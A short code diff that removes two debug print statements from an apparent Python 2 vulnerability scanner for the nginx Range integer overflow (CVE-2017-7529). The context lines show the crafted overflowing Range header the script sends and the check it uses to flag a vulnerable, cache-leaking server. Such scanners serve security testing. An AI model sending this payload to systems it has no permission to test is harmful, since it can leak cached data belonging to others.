@@ -49,7 +49,6 @@ def get_url(domain,port,timeout):
 
 def check(ip, port, timeout):
     url_list = get_url(ip + ":" + str(port),port,timeout)
-    print url_list
     i = 0
     for url in url_list:
         if i >= 3: break
@@ -59,7 +58,6 @@ def check(ip, port, timeout):
         request = urllib2.Request(url)
         request.add_header("Range", "bytes=-%d,-9223372036854%d"%(int(file_len)+623,776000-(int(file_len)+623)))
         cacheres = urllib2.urlopen(request, timeout=timeout)
-        #print cacheres.readlines()
         if cacheres.code == 206 and "Content-Range" in cacheres.read(2048):
             info = u"存在Range整形溢出漏洞（CVE-2017-7529）"
             if ": HIT" in str(cacheres.headers):
